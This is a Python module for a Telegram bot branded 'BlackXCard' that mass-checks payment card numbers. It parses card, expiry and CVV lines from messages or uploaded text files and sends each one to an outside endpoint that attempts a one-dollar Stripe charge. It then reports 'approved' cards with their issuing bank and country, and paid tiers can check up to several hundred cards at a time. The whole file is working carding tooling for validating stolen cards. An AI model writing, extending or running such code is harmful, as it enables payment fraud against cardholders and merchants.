import asyncio
import aiohttp
import json
import re
import time
import io
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes, CallbackQueryHandler, CommandHandler
from telegram.error import BadRequest, TelegramError
import logging
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- CONFIGURATION ---
SK_API_URL = "https://blinkop.online/skb.php?sk={stripe_key}&amount=1&lista="
SK_CARD_REGEX = re.compile(r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b")

# User tiers
ADMIN_IDS = {7254736651}
OWNER_ID = 7254736651

# Card limits
CARD_LIMITS = {
    "owner": 1000,
    "admin": 400,
    "premium": 300,
    "free": 0
}

# Active checks tracker
active_mass_checks = {}

# --- HELPER FUNCTIONS ---
def extract_cards_from_text(text: str) -> list:
    """Extract cards from text"""
    cards = []
    for line in text.split('\n'):
        line = line.strip()
        if not line:
            continue
            
        match = SK_CARD_REGEX.search(line)
        if match:
            card, mm, yy, cvv = match.groups()
            mm = mm.zfill(2)
            yy = yy[-2:] if len(yy) == 4 else yy
            cards.append(f"{card}|{mm}|{yy}|{cvv}")
    
    return cards

async def get_user_tier(user_id: int) -> str:
    """Get user tier"""
    if user_id == OWNER_ID:
        return "owner"
    elif user_id in ADMIN_IDS:
        return "admin"
    
    user_data = await get_user(user_id)
    if user_data:
        plan = user_data.get('plan', '').lower()
        if plan in ['premium', 'plus', 'gold', 'platinum', 'corporate']:
            return "premium"
    
    return "free"

async def check_sk_card(session: aiohttp.ClientSession, card: str) -> dict:
    """Check single SK card"""
    try:
        url = SK_API_URL + card
        async with session.get(url, timeout=30) as response:
            text = await response.text()
            
            try:
                data = json.loads(text)
                ok_status = data.get("ok", False)
                message = data.get("message", "No response")
                decline_code = data.get("decline_code", "")
                
                return {
                    "status": "approved" if ok_status else "declined",
                    "message": message,
                    "decline_code": decline_code,
                    "raw_response": text[:200]
                }
            except json.JSONDecodeError:
                return {
                    "status": "error",
                    "message": "Invalid API response"
                }
                
    except asyncio.TimeoutError:
        return {"status": "error", "message": "Timeout"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

async def get_bin_info(bin_number: str) -> dict:
    """Get BIN information"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://lookup.binlist.net/{bin_number}", timeout=5) as response:
                if response.status == 200:
                    data = await response.json()
                    return {
                        "scheme": data.get("scheme", "Unknown"),
                        "bank": data.get("bank", {}).get("name", "Unknown"),
                        "country": data.get("country", {}).get("name", "Unknown"),
                        "emoji": data.get("country", {}).get("emoji", "")
                    }
    except:
        pass
    return {"scheme": "Unknown", "bank": "Unknown", "country": "Unknown", "emoji": ""}

def create_status_keyboard(user_id: int) -> InlineKeyboardMarkup:
    """Create status keyboard with buttons"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 🔥", callback_data="noop")],
        [InlineKeyboardButton("𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 🦂", callback_data="noop")],
        [InlineKeyboardButton("⛔ 𝙎𝙏𝙊𝙋", callback_data=f"stop_sktxt:{user_id}")]
    ])

# --- MASS PROCESSING FUNCTION ---
async def process_sktxt_mass(user_id: int, cards: list, message_obj, update: Update):
    """Process mass SK check"""
    user_tier = await get_user_tier(user_id)
    card_limit = CARD_LIMITS.get(user_tier, 300)
    
    # Apply card limit
    if len(cards) > card_limit:
        cards = cards[:card_limit]
    
    total_cards = len(cards)
    processed = 0
    approved = 0
    declined = 0
    errors = 0
    
    # Store approved cards for file
    approved_cards_list = []
    results_log = []
    
    # Create single status message
    keyboard = create_status_keyboard(user_id)
    
    try:
        status_msg = await message_obj.reply_text(
            f"<pre>𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜...</pre>",
            reply_markup=keyboard,
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        logger.error(f"Failed to send status message: {e}")
        return
    
    # Store active check
    active_mass_checks[user_id] = {
        "stop": False,
        "message_id": status_msg.message_id,
        "chat_id": status_msg.chat_id
    }
    
    start_time = time.time()
    
    # Process cards
    async with aiohttp.ClientSession() as session:
        for card in cards:
            # Check if stopped
            if active_mass_checks.get(user_id, {}).get("stop", False):
                break
            
            processed += 1
            card_start = time.time()
            
            # Check card
            result = await check_sk_card(session, card)
            elapsed_card = time.time() - card_start
            
            # Log result
            result_entry = f"{card} | {result['status'].upper()} | {result.get('message', 'N/A')}"
            results_log.append(result_entry)
            
            if result["status"] == "approved":
                approved += 1
                approved_cards_list.append(card)
                
                # Send approved card individually
                bin_number = card.split("|")[0][:6]
                bin_info = await get_bin_info(bin_number)
                
                approved_msg = (
                    f"🔥 <b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b>\n\n"
                    f"<b>𝐂𝐚𝐫𝐝</b>\n"
                    f"⤷ <code>{escape(card)}</code>\n"
                    f"<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙎𝙩𝙧𝙞𝙥𝙚 𝘾𝙝𝙖𝙧𝙜𝙚 𝙎𝙠 𝘽𝙖𝙨𝙚𝙙! 1 𝘿𝙤𝙡𝙡𝙚𝙧</b>\n"
                    f"<b>𝐑𝐞𝐬𝐩𝙤𝙣𝙨𝙚 ➵</b> <code>{escape(result.get('message', 'Approved'))}</code>\n\n"
                    f"<pre>"
                    f"𝘽𝙧𝙖𝙣𝙙  ➵ {escape(bin_info['scheme'])}\n"
                    f"𝘽𝙖𝙣𝙠 ➵ {escape(bin_info['bank'])}\n"
                    f"𝘾𝙤𝙪𝙣𝙩𝙧𝙮  ➵ {escape(bin_info['country'])} {bin_info['emoji']}"
                    f"</pre>\n\n"
                    f"<b>𝐃𝐄𝐕 ➵</b> <a href='tg://resolve?domain=BlinkIsop'>𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™</a>\n"
                    f"<b>𝐄𝐥𝙖𝙥𝙨𝙚𝙙 ➵</b> {elapsed_card:.1f}s"
                )
                
                try:
                    await update.effective_message.reply_text(
                        approved_msg,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True
                    )
                except Exception as e:
                    logger.error(f"Failed to send approved card: {e}")
                    
            elif result["status"] == "declined":
                declined += 1
            else:
                errors += 1
            
            # Update status periodically
            if processed % 10 == 0 or processed == total_cards:
                if active_mass_checks.get(user_id, {}).get("stop", False):
                    break
                
                # SIRF YEH MESSAGE
                try:
                    await status_msg.edit_text(
                        f"<pre>𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝙋𝙧𝙤𝙘𝙚𝙨𝙞𝙣𝙜...</pre>",
                        reply_markup=keyboard,
                        parse_mode=ParseMode.HTML
                    )
                except Exception as e:
                    logger.error(f"Failed to update status: {e}")
            
            # Small delay - YEH LINE CHECK KARO (4 spaces indent)
            await asyncio.sleep(0.2)  # ✅ Yeh 4 spaces se indent hona chahiye
    
    # Final summary and file
    elapsed_total = time.time() - start_time
    
    # Create summary file
    summary_text = (
        f"═══════════════════════════════════\n"
        f"      BlackXCard Mass SK Check\n"
        f"═══════════════════════════════════\n\n"
        f"📅 Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"👤 User ID: {user_id}\n"
        f"👑 Tier: {user_tier.title()}\n\n"
        f"📊 STATISTICS:\n"
        f"═══════════════════════════════════\n"
        f"• Total Cards: {total_cards}\n"
        f"• Approved: {approved}\n"
        f"• Declined: {declined}\n"
        f"• Errors: {errors}\n"
        f"• Processed: {processed}\n"
        f"• Elapsed Time: {elapsed_total:.1f}s\n\n"
        f"✅ APPROVED CARDS ({approved}):\n"
        f"═══════════════════════════════════\n"
    )
    
    # Add approved cards
    for i, card in enumerate(approved_cards_list, 1):
        summary_text += f"{i}. {card}\n"
    
    summary_text += f"\n📋 ALL RESULTS:\n"
    summary_text += f"═══════════════════════════════════\n"
    for result in results_log:
        summary_text += f"{result}\n"
    
    # Send file
    try:
        file_obj = io.BytesIO(summary_text.encode('utf-8'))
        file_obj.name = "BlackXCard_MassSkCheck.txt"
        
        await update.effective_message.reply_document(
            document=file_obj,
            caption=f"📊 <b>Mass SK Check Complete</b>\n\n"
                   f"✅ <b>Approved:</b> {approved}\n"
                   f"❌ <b>Declined:</b> {declined}\n"
                   f"⚠️ <b>Errors:</b> {errors}\n"
                   f"⏱️ <b>Time:</b> {elapsed_total:.1f}s",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        logger.error(f"Failed to send summary file: {e}")
    
    # Final status update
    final_msg = (
        f"✅ <b>Mass SK Check Complete!</b>\n\n"
        f"📊 <b>Cards Processed:</b> {processed}\n"
        f"✅ <b>Approved:</b> {approved}\n"
        f"❌ <b>Declined:</b> {declined}\n"
        f"⚠️ <b>Errors:</b> {errors}\n"
        f"⏱️ <b>Total Time:</b> {elapsed_total:.1f}s\n\n"
        f"📁 <i>Detailed results saved to file</i>"
    )
    
    try:
        await status_msg.edit_text(
            final_msg,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Complete", callback_data="noop")]
            ])
        )
    except:
        pass
    
    # Cleanup
    if user_id in active_mass_checks:
        del active_mass_checks[user_id]

# --- MAIN COMMAND HANDLER ---
async def sktxt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /sktxt command"""
    user = update.effective_user
    user_id = user.id
    
    # Check user tier
    user_tier = await get_user_tier(user_id)
    
    if user_tier == "free":
        await update.message.reply_text(
            "❌ <b>This command is only for Premium users!</b>\n\n"
            "💎 <i>Upgrade to Premium to use Mass SK Checker</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if already running
    if user_id in active_mass_checks:
        await update.message.reply_text(
            "⏳ <b>You already have an active mass check!</b>\n"
            "Wait for it to complete or use STOP button.",
            parse_mode=ParseMode.HTML
        )
        return
    
    cards = []
    
    # Check for TXT file attachment
    if update.message.document:
        doc = update.message.document
        if doc.mime_type == 'text/plain' or doc.file_name.endswith('.txt'):
            try:
                file = await doc.get_file()
                file_bytes = await file.download_as_bytearray()
                file_text = file_bytes.decode('utf-8')
                cards = extract_cards_from_text(file_text)
                
                if not cards:
                    await update.message.reply_text(
                        "❌ <b>No valid cards found in the TXT file!</b>\n"
                        "Format: 4111111111111111|12|2025|123",
                        parse_mode=ParseMode.HTML
                    )
                    return
                    
            except Exception as e:
                await update.message.reply_text(
                    f"❌ <b>Error reading TXT file:</b>\n<code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
                return
    
    # Check for replied message with text
    elif update.message.reply_to_message:
        replied_msg = update.message.reply_to_message
        
        # Check if replied to TXT file
        if replied_msg.document:
            doc = replied_msg.document
            if doc.mime_type == 'text/plain' or doc.file_name.endswith('.txt'):
                try:
                    file = await doc.get_file()
                    file_bytes = await file.download_as_bytearray()
                    file_text = file_bytes.decode('utf-8')
                    cards = extract_cards_from_text(file_text)
                except Exception as e:
                    await update.message.reply_text(
                        f"❌ <b>Error reading TXT file:</b>\n<code>{escape(str(e))}</code>",
                        parse_mode=ParseMode.HTML
                    )
                    return
        
        # Check if replied to text message
        elif replied_msg.text:
            cards = extract_cards_from_text(replied_msg.text)
    
    # Check for command arguments
    elif context.args:
        text = " ".join(context.args)
        cards = extract_cards_from_text(text)
    
    # No cards found
    if not cards:
        await update.message.reply_text(
            "⚠️ <b>Usage:</b>\n\n"
            "1. <code>/sktxt card1|mm|yy|cvv card2|mm|yy|cvv</code>\n"
            "2. Reply to a message containing cards\n"
            "3. Send a TXT file with cards\n"
            "4. Reply to a TXT file\n\n"
            f"📊 <b>Your limit:</b> {CARD_LIMITS.get(user_tier, 300)} cards",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Apply card limit
    card_limit = CARD_LIMITS.get(user_tier, 300)
    original_count = len(cards)
    
    if original_count > card_limit:
        cards = cards[:card_limit]
        await update.message.reply_text(
            f"⚠️ <b>Card limit applied!</b>\n\n"
            f"📊 Cards in file: {original_count}\n"
            f"📊 Your limit: {card_limit}\n"
            f"📊 Will process: {len(cards)}\n\n"
            f"<i>Only first {card_limit} cards will be checked.</i>",
            parse_mode=ParseMode.HTML
        )
    
    # Start processing immediately (NO extra message)
    asyncio.create_task(
        process_sktxt_mass(user_id, cards, update.message, update)
    )

# --- STOP HANDLER ---
async def stop_sktxt_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle stop button"""
    query = update.callback_query
    await query.answer()
    
    if not query.data.startswith("stop_sktxt:"):
        return
    
    user_id = int(query.data.split(":")[1])
    
    # Check if user owns this process
    if query.from_user.id != user_id:
        await query.answer("❌ You can't stop others' processes!", show_alert=True)
        return
    
    if user_id in active_mass_checks:
        active_mass_checks[user_id]["stop"] = True
        try:
            await query.edit_message_text(
                "🛑 <b>Mass SK Check Stopped by User</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Stopped", callback_data="noop")]
                ])
            )
        except:
            pass

# --- NOOP HANDLER ---
async def noop_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle non-working buttons"""
    query = update.callback_query
    await query.answer("ℹ️ Display only", show_alert=False)

# --- REGISTER FUNCTION ---
def register_sktxt_handlers(application):
    """Register SKTXT handlers"""
    application.add_handler(CallbackQueryHandler(
        stop_sktxt_handler, 
        pattern=r"^stop_sktxt:"
    ))
    application.add_handler(CallbackQueryHandler(
        noop_handler, 
        pattern=r"^noop"
    ))